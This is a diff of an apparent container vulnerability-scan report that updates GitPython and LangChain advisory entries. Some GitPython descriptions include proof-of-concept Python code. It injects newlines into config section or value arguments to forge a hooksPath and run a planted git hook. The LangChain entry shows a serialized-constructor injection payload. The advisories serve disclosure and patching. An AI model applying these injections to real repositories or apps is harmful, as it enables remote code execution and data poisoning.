           },
           "CVSS": {
             "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H",
               "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N/E:P",
+              "V3Score": 7.1,
               "V40Score": 7.8
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H",
+              "V3Score": 7.1
             }
           },
           "References": [
             "https://github.com/gitpython-developers/GitPython",
-            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-7545-fcxq-7j24"
-          ]
+            "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.48",
+            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-7545-fcxq-7j24",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-44243"
+          ],
+          "PublishedDate": "2026-05-07T19:16:02.227Z",
+          "LastModifiedDate": "2026-05-07T21:12:00.777Z"
         },
         {
           "VulnerabilityID": "CVE-2026-44244",
@@ -1214,9 +1346,12 @@
             "Name": "GitHub Security Advisory pip",
             "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
           },
-          "Title": "GitPython: Newline injection in config_writer().set_value() enables RCE via core.hooksPath",
-          "Description": "`GitConfigParser.set_value()` passes values to Python's `configparser` without validating for newlines. GitPython's own `_write()` converts embedded newlines into indented continuation lines (e.g. `\\n` becomes `\\n\\t`), but Git still accepts an indented `[core]` stanza as a section header — so the injected `core.hooksPath` becomes effective configuration. Any Git operation that invokes hooks (commit, merge, checkout) will then execute scripts from the attacker-controlled path.\n\nThe vulnerability is not merely malformed config output: GitPython's own writer converts embedded newlines into indented continuation lines, but Git still accepts an indented `[core]` stanza as a section header, so the injected `core.hooksPath` becomes effective configuration.\n\nThis was found while auditing MLRun's `project.push()` method, which passes `author_name` and `author_email` directly to `config_writer().set_value()` with no sanitization. Both parameters cross a trust boundary — they are caller-supplied API inputs that end up in `.git/config`.\n\nPoC (standalone, no MLRun required):\n\n```python\nimport git, subprocess, os\n\nrepo = git.Repo(\"/tmp/testrepo\")\n\nwith repo.config_writer() as cw:\n    cw.set_value(\"user\", \"name\", \"foo\\n[core]\\nhooksPath=/tmp/hooks\")\n\nr = subprocess.run([\"git\", \"config\", \"core.hooksPath\"], cwd=\"/tmp/testrepo\", capture_output=True, text=True)\nassert r.returncode == 0\nprint(r.stdout.strip())  # /tmp/hooks\n\nos.makedirs(\"/tmp/hooks\", exist_ok=True)\nopen(\"/tmp/hooks/pre-commit\", \"w\").write(\"#!/bin/sh\\nid \u003e /tmp/pwned\\n\")\nos.chmod(\"/tmp/hooks/pre-commit\", 0o755)\n\nrepo.index.add([\"README\"])\nrepo.git.commit(m=\"test\")\nprint(open(\"/tmp/pwned\").read())  # uid=...\n```\n\nTested on GitPython 3.1.46, git 2.39+.\n\nImpact: This is persistent repo config poisoning. Any user who can supply `author_name` or `author_email` to an application calling `config_writer().set_value()` can redirect Git hook execution to an arbitrary path. In a multi-user or hosted environment (e.g. a shared MLRun server where multiple users push to the same repositories), one user can poison the `.git/config` of a shared repo and have their hooks run in the context of every subsequent Git operation by any user. On single-user deployments, the impact depends on whether the application later invokes Git hooks automatically.\n\nRemediation: `set_value()` should raise on CR, LF, or NUL in values rather than silently pass them through:\n\n```python\nimport re\n\nif isinstance(value, (str, bytes)) and re.search(r\"[\\r\\n\\x00]\", str(value)):\n    raise ValueError(\"Git config values must not contain CR, LF, or NUL\")\n```\n\nRejecting is safer than stripping — a stripped newline might indicate the caller is passing unsanitized input at a higher level, and silent normalization masks that.\n\nAffected wherever `config_writer().set_value(section, key, user_input)` is called with external input.** GitPython is a dependency of DVC, MLflow, Kedro, and others — worth auditing their `set_value()` call sites for externally influenced inputs.",
+          "Title": "GitPython is a python library used to interact with Git repositories.  ...",
+          "Description": "GitPython is a python library used to interact with Git repositories. Prior to version 3.1.49, GitConfigParser.set_value() passes values to Python's configparser without validating for newlines. GitPython's own _write() converts embedded newlines into indented continuation lines (e.g. \\n becomes \\n\\t), but Git still accepts an indented [core] stanza as a section header — so the injected core.hooksPath becomes effective configuration. Any Git operation that invokes hooks (commit, merge, checkout) will then execute scripts from the attacker-controlled path. This issue has been patched in version 3.1.49.",
           "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-94"
+          ],
           "VendorSeverity": {
             "ghsa": 3
           },
@@ -1228,8 +1363,54 @@
           },
           "References": [
             "https://github.com/gitpython-developers/GitPython",
-            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-v87r-6q3f-2j67"
-          ]
+            "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.49",
+            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-v87r-6q3f-2j67",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-44244"
+          ],
+          "PublishedDate": "2026-05-07T19:16:02.357Z",
+          "LastModifiedDate": "2026-05-07T21:16:30.283Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-mv93-w799-cj2w",
+          "PkgName": "GitPython",
+          "PkgPath": "usr/local/lib/python3.11/site-packages/gitpython-3.1.45.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/gitpython@3.1.45",
+            "UID": "815b95a9c29123ee"
+          },
+          "InstalledVersion": "3.1.45",
+          "FixedVersion": "3.1.50",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:097275d67fcdb97071c047b4b80f7ba07ac6e2de12e1f594ea95528c0ad359f1",
+            "DiffID": "sha256:69fc21d9b19807c563f925dca94eb77918336d4cf00cd82bc4d247de3d8f7c69"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-mv93-w799-cj2w",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Title": "GitPython: Newline injection in config_writer() section parameter bypasses CVE-2026-42215 patch, enabling RCE via core.hooksPath",
+          "Description": "Summary\n\nThe patch for CVE-2026-42215 (GitPython 3.1.49) validates newlines only in the value parameter of set_value(). The section and option parameters are passed to configparser without any newline validation. An attacker who controls the section argument can inject \\n to write arbitrary section headers into .git/config, including a forged [core] section with hooksPath pointing to an attacker-controlled directory, leading to RCE when any git hook is triggered.\n\nDetails\n\nFile: git/config.py — GitPython 3.1.49 (latest patched version)\n\n```python\n  def set_value(self, section: str, option: str, value) -\u003e \"GitConfigParser\":\n      value_str = self._value_to_string_safe(value)   # only value is validated\n      if not self.has_section(section):\n          self.add_section(section)                    # section not validated\n      super().set(section, option, value_str)          # option not validated\n      return self\n```\n\n_write() formats section headers as \"[%s]\\n\" % name. When section = \"user]\\n[core\", this writes [user]\\n[core]\\n — two valid section headers — into .git/config.\n\nPoC\n\n```python\n  import git, os, subprocess\n\n  repo = git.Repo.init(\"/tmp/bypass_test\")\n\n  os.makedirs(\"/tmp/evil_hooks\", exist_ok=True)\n  with open(\"/tmp/evil_hooks/pre-commit\", \"w\") as f:\n      f.write(\"#!/bin/sh\\nid \u003e /tmp/rce_proof.txt\\n\")\n  os.chmod(\"/tmp/evil_hooks/pre-commit\", 0o755)\n\n  # Inject newline into section parameter (not value — already patched)\n  with repo.config_writer() as cw:\n      cw.set_value(\"user]\\n[core\", \"hooksPath\", \"/tmp/evil_hooks\")\n\n  r = subprocess.run([\"git\", \"-C\", \"/tmp/bypass_test\", \"config\", \"core.hooksPath\"],\n                     capture_output=True, text=True)\n  print(r.stdout.strip())  # → /tmp/evil_hooks\n\n  subprocess.run([\"git\", \"-C\", \"/tmp/bypass_test\", \"commit\", \"--allow-empty\", \"-m\", \"x\"])\n  print(open(\"/tmp/rce_proof.txt\").read())  # → uid=1000(...) RCE confirmed\n```\n\nImpact\n\nSame attack outcome as CVE-2026-42215 (RCE via core.hooksPath injection). The patch is incomplete — only value is validated while section and option remain injectable.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H",
+              "V3Score": 7
+            }
+          },
+          "References": [
+            "https://github.com/advisories/GHSA-rpm5-65cw-6hj4",
+            "https://github.com/gitpython-developers/GitPython",
+            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-mv93-w799-cj2w"
+          ],
+          "PublishedDate": "2026-05-08T23:19:02Z",
+          "LastModifiedDate": "2026-05-08T23:19:02Z"
         },
         {
           "VulnerabilityID": "CVE-2026-44307",
@@ -1392,6 +1573,45 @@
           ],
           "PublishedDate": "2026-01-20T01:15:57.723Z",
           "LastModifiedDate": "2026-03-11T23:12:19.323Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44843",
+          "PkgName": "langchain-core",
+          "PkgPath": "usr/local/lib/python3.11/site-packages/langchain_core-1.3.2.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/langchain-core@1.3.2",
+            "UID": "d69d2e5ef55abfa3"
+          },
+          "InstalledVersion": "1.3.2",
+          "FixedVersion": "1.3.3, 0.3.85",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:097275d67fcdb97071c047b4b80f7ba07ac6e2de12e1f594ea95528c0ad359f1",
+            "DiffID": "sha256:69fc21d9b19807c563f925dca94eb77918336d4cf00cd82bc4d247de3d8f7c69"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44843",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Title": "LangChain vulnerable to unsafe deserialization of attacker-controlled objects through overly broad `load()` allowlists",
+          "Description": "LangChain contains older runtime code paths that deserialize run inputs, run outputs, or other application-controlled payloads using overly broad object allowlists. These paths may call `load()` with `allowed_objects=\"all\"`. This does not enable arbitrary Python object deserialization, but it does allow any trusted LangChain-serializable object to be revived, which is broader than these runtime paths require. As a result, attacker-supplied LangChain serialized constructor dictionaries may cause trusted runtime paths to instantiate classes with untrusted constructor arguments.\n\nApplications are exposed only when all of the following are true:\n\n1. The application accepts untrusted structured input, such as JSON, from a user or network request.\n2. The application does not validate or canonicalize that input into an inert schema before invoking LangChain.\n3. Attacker-controlled nested dictionaries or lists are preserved in LangChain run inputs or outputs.\n4. The application uses an affected API path that later deserializes that run data.\n\nKnown affected runtime surfaces include:\n\n- `RunnableWithMessageHistory`\n- `astream_log()`\n- `astream_events(version=\"v1\")`\n\nRelated unsafe deserialization patterns may also affect applications that explicitly load serialized LangChain prompt or runnable objects from untrusted sources, including shared prompt stores, Hub artifacts with model configuration, or other application-controlled serialization stores.\n\nApplications that validate incoming requests against a fixed schema, such as coercing user input to a plain string or message-content field before invoking LangChain, are unlikely to expose this deserialization primitive.\n\nThis release also fixes a related secret-marker validation bypass in the serialization and deserialization layer (`_is_lc_secret`). That issue creates an additional path by which attacker-controlled constructor dictionaries can avoid escaping during `dumps()` -\u003e `loads()` round-trips and reach LangChain object revival logic.\n\n## Impact\n\nAn attacker who can submit untrusted structured input to an affected application, and have that structure preserved in LangChain run data, may be able to inject LangChain serialized constructor payloads such as:\n\n```json\n{\n  \"lc\": 1,\n  \"type\": \"constructor\",\n  \"id\": [\"langchain_core\", \"messages\", \"ai\", \"AIMessage\"],\n  \"kwargs\": {\"content\": \"attacker-controlled content\"}\n}\n```\n\nIf this payload reaches a broad `load()` call, LangChain may instantiate the referenced class instead of treating the payload as inert user data.\n\nRealistic impacts include:\n\n- Persistent chat-history poisoning when revived `AIMessage`, `HumanMessage`, or `SystemMessage` objects are stored by `RunnableWithMessageHistory`.\n- Prompt injection or behavior manipulation if attacker-controlled messages are later included in model context.\n- Instantiation of unexpected trusted LangChain objects with attacker-controlled constructor arguments.\n- Possible credential disclosure or server-side requests if a reachable object reads environment credentials, creates clients, or contacts attacker-controlled endpoints during initialization.\n- Additional prompt-template or runnable-configuration impacts in applications that separately load and execute untrusted serialized LangChain objects.\n\n## Remediation\n\nLangChain will deprecate the affected APIs as part of this fix:\n\n- `RunnableWithMessageHistory`\n- `astream_log()`\n- `astream_events(version=\"v1\")`\n\nThese are older code paths that are no longer recommended for new applications. They were not previously marked as deprecated, but recent LangChain documentation has primarily directed users toward newer streaming and memory patterns, including the `stream` API. Applications should migrate to the currently recommended APIs rather than continue depending on these older surfaces.\n\nSeparately, LangChain will update `load()` and `loads()` to tighten deserialization behavior so broad object revival is not applied implicitly to untrusted or application-controlled payloads. The older runtime surfaces listed above are being deprecated rather than preserved as supported paths for broad runtime deserialization.\n\nThis release also fixes a related secret-marker validation bypass in the serialization and deserialization layer (`_is_lc_secret`). That issue creates an additional path by which attacker-controlled constructor dictionaries can avoid escaping during `dumps()` -\u003e `loads()` round-trips and reach LangChain object revival logic.\n\n## Guidance for `load()` and `loads()`\n\n`load()` and `loads()` should be used only with trusted LangChain manifests or serialized objects from trusted storage. Do not pass user-controlled data to `load()` or `loads()`, and do not use them as general parsers for request bodies, tool inputs, chat messages, or other attacker-controlled data.\n\n`load()` and `loads()` are beta APIs, and their behavior may change as LangChain narrows unsafe defaults. Future LangChain versions will require callers to be explicit about which objects may be revived. Users should pass a narrow `allowed_objects` value appropriate for the specific trusted manifest they are loading, rather than relying on broad defaults or `allowed_objects=\"all\"`, which permits the full trusted LangChain serialization allowlist.\n\n## Credits\n\nThe original issue was first reported by @u-ktdi.\n\nSimilar findings were reported by @dewankpant, @shrutilohani, @Moaaz-0x, @pucagit.\n\nA related `_is_lc_secret` marker bypass affecting `dumps()` -\u003e `loads()` round-trips was reported by @yardenporat353 (and a similar report by @localhost-detect)",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
+              "V3Score": 8.2
+            }
+          },
+          "References": [
+            "https://github.com/langchain-ai/langchain",
+            "https://github.com/langchain-ai/langchain/security/advisories/GHSA-pjwx-r37v-7724"
+          ]
         },
         {
           "VulnerabilityID": "CVE-2026-42561",
